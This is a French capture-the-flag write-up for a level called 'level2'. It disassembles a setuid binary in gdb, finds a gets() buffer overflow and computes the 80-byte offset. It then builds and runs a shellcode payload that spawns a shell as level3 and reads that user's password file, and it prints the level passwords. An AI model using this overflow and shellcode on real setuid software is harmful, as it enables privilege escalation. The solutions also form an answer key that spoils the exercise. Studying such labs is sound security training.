# Level2

> login:password -> *`level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`*
```
:~$ su level2
Password:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
---

```
:~$ pwd
/home/user/level2
```

```
:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level2` :

```
:~$ ./level2
(input)

:~$ ./level2 test
(input)
```

Avec ou sans paramètre, le binaire attends un input

```
:~$ gdb level2
...

(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	    push   %ebp
   0x08048540 <+1>:	    mov    %esp,%ebp
   0x08048542 <+3>:	    and    $0xfffffff0,%esp
   0x08048545 <+6>:	    call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret 
End of assembler dump.

(gdb) disas p
Dump of assembler code for function p:
   (...)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   (...)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>: mov    0x4(%ebp),%eax
   (...)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   (...)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   (...)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   (...)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.

(gdb) quit
```

On remarque que le main du binaire appel une fonction `p()` (+6) et que cette derniere appelle plusieurs fonctions dont une fonction `gets()` (+25) vulnerable a un buffer overflow.

Pour definir le buffer offset, on va run le programme dans gdb en suivant ces quelques etapes:
- `break *0x080484f2`: on pose un breakpoint sur l'eip 0x080484f2 (+30) qui intervient juste apres notre `gets()` (+25).
- `x $eax`: arrive a notre break, on cherche l'hexadecimal de `$eax`.
- `info frame`: on affiche plus d'informations concernant la frame et trouver le `Saved registers`.
- `print` saved_register - hexa_eax: on affiche notre offset, ici `80`.

```
(gdb) break *0x080484f2
Breakpoint 1 at 0x80484f2
(gdb) run
Starting program: /home/user/level2/level2 
test

Breakpoint 1, 0x080484f2 in p ()
(gdb) x $eax
0xbffff6dc:	0x74736574
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x80484f2 in p; saved eip 0x804854a
 called by frame at 0xbffff740
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
(gdb) print 0xbffff72c - 0xbffff6dc
$1 = 80
```
- On va pouvoir faire notre exploit avec l'utilisation d'un [shellcode](https://shell-storm.org/shellcode/files/shellcode-575.html) qui va permettre d'ouvrir le prompt a la saisie:\
`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
- Puis finir par ajouter l'adresse de retour:\
"`\x08\xa0\x04\x08`"
- Le offset est de 80, mais notre shellcode est de **21 bytes** et le retour de **4 bytes**. On va donc devoir inserer (80 - (21+4) = 59) **59 bytes** entre le shellcode et le retour pour rendre executer notre exploit du binaire `level2`

```
:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "q" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2

:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "q" * 59 + "\x08\xa0\x04\x08"' > /tmp/level2
:~$ cat /tmp/level2 - | ./level2
j
 X�Rh//shh/bin��1�̀qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
